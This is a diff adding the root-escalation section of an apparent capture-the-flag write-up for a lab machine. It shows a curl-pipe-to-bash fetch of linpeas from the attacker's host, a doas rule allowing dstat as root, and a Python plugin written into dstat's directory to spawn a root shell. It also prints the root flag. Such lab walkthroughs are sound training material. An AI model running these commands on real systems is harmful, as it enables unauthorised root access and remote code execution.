@@ -336,5 +336,78 @@ curl 10.10.14.7:8000/linpeas.sh | bash
 ```
 From LINPEAS we also see /usr/local/bin/doas as a possible privesc. The reason why we focus specifically on /usr/local/bin/doas compared to other files that we can run as root is because files in the /local directory are user or admin managed rather than system managed, meaning that they are likely manually downloaded and may have additional rights. 
 
+We then search for any files on the system that contain the word "doas"
+```
+find / -type f -name "*doas*" 2>/dev/null
+
+/usr/local/share/man/man5/doas.conf.5
+/usr/local/share/man/man1/doas.1
+/usr/local/share/man/man8/vidoas.8
+/usr/local/share/man/man8/doasedit.8
+/usr/local/bin/doasedit
+/usr/local/bin/doas
+/usr/local/bin/vidoas
+/usr/local/etc/doas.conf
+```
+and we see the interesting configuration file "doas.conf" and we run the cat command to see the configuration:
+
+```
+cat /usr/local/etc/doas.conf 
+
+permit nopass player as root cmd /usr/bin/dstat
+```
+The configuration tells us that we can run /usr/bin/dstat as root using the doas program.
+
+If we run 
+```
+find / -group player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys' 
+ 
+/usr/local/share/dstat
+/home/player
+/home/player/.cache
+/home/player/.cache/motd.legal-displayed
+/home/player/.bash_logout
+/home/player/.bashrc
+/home/player/.profile
+/home/player/user.txt
+```
+We see all the files/folders that we have group access to.
+
+We notice that we have access to the /usr/local/share/dstat folder, which is most likely linked to the /usr/bin/dstat executable. 
+
+If we explore the /usr/bin/dstat command, we notice that we can import plugins:
+```
+cd /usr/bin
+dstat --help | grep plugin
+
+--list list all available plugins
+--<plugin name> enable external plugin by name (see --list)
+```
+And we see that we can enable external plugins that are from the file /usr/share/dstat if we use the dstat --list command. 
+
+We can check GTFObins, a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems, to see if we have anything for the binary dstat.
+
+We see https://gtfobins.github.io/gtfobins/dstat/
+
+and use the following commands in the plugin directory to create a new python plugin to give us a system shell:
+
+```
+echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
+doas /usr/bin/dstat --xxx
+
+whoami
+
+root
+
+cd /root
+cat root.txt
+
+a2a69c40ba21aa0192377b2b61d03803
+```
+and we finally acquire the final flag root.txt
+
+### root.txt found
+
+In this box, we have primarily abused the Tiny File Manager located on the website's subdirectory since it used the default admin credentials of admin/admin123@ and used the file manager to launch a reverse web shell to our netcat listener. We also found an additional vhost through our web shell by browsing to our /etc/ directory called soc-player.soccer.htb which contains a SQL injection that got us user credentials which contained permissions to launch the "doas" program which allows us to launch the "dstat" binary as root. We then escalated our shell to root by using the dstat exploit on GTFObins.
 
 
